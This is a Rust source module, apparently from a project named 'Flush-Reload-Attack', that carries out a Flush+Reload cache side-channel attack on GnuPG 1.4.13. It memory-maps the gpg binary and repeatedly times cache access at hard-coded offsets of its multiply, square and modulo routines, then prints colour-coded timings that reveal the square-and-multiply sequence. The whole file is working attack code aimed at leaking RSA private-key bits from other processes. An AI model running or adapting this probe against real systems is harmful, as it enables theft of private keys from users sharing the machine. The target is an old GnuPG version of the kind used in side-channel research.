extern crate colored;
extern crate libc;
extern crate memmap;
use self::libc::sched_yield;
use self::memmap::Mmap;
use self::memmap::MmapOptions;
use asm;
use colored::*;
use std::fs::File;
use std::io::Write;

pub mod gpg_probe {
    use super::*;
    const MUL_OFFSET: usize = 0x8f67d;
    const SQR_OFFSET: usize = 0x8fc89;
    const MOD_OFFSET: usize = 0x8ed5c;
    const SLOT_TIME: u64 = 2500;
    const SLOTS: usize = 1000;
    pub fn probe(threshhold: u32) {
        let mut mul_timings: [u64; SLOTS] = [0; SLOTS];
        let mut sqr_timings: [u64; SLOTS] = [0; SLOTS];
        let mut mod_timings: [u64; SLOTS] = [0; SLOTS];
        /*TODO: Make relative path*/
        let gnupg = File::open("/home/akash/Projects/Flush-Reload-Attack/bin/gpg-1.4.13").unwrap();
        let gpg_mmap = unsafe { MmapOptions::new().map(&gnupg).unwrap() };
        println!(
            "The length of the memory map for GNUGP is {} bytes",
            gpg_mmap.len()
        );
        for i in 0..SLOTS {
            sleep_process(SLOT_TIME);
            unsafe {compute_fr(
                i,
                &mut mul_timings,
                &mut sqr_timings,
                &mut mod_timings,
                &gpg_mmap,
            );}
        }
        println!("Multiply operation timings");
        print_arr(&mul_timings, threshhold);
        println!("Square operation timings");
        print_arr(&sqr_timings, threshhold);
        println!("Modulo operation timings");
        print_arr(&mod_timings, threshhold);
    }
    unsafe fn compute_fr(
        iter: usize,
        mul_time: &mut [u64],
        sqr_time: &mut [u64],
        mod_time: &mut [u64],
        mapping: &Mmap
    ) {
        let mapping_ptr: *const u8 = &mapping[0];
        mul_time[iter] = asm::full_flush_reload_time(mapping_ptr.add(MUL_OFFSET));
        sqr_time[iter] = asm::full_flush_reload_time(mapping_ptr.add(SQR_OFFSET));
        mod_time[iter] = asm::full_flush_reload_time(mapping_ptr.add(MOD_OFFSET));
    }
    fn sleep_process(cycles: u64) {
        let mut start_time = asm::get_rdtsc();
        let mut finish_time = start_time + cycles;
        if cycles > 1000 {
            finish_time -= 1000;
        }
        while start_time < finish_time {
            unsafe { sched_yield() };
            start_time = asm::get_rdtsc();
        }
    }
    fn print_arr(arr: &[u64; SLOTS], threshhold: u32) {
        for i in arr.iter() {
            let elem: String = format!("{}",i);
            let colored_elem: ColoredString;
            if *i as u32 > threshhold  {
                colored_elem = elem.red();
            } else {
                colored_elem = elem.green();
            }
            print!("{}, ", colored_elem);
        }
        println!("");
    }
}
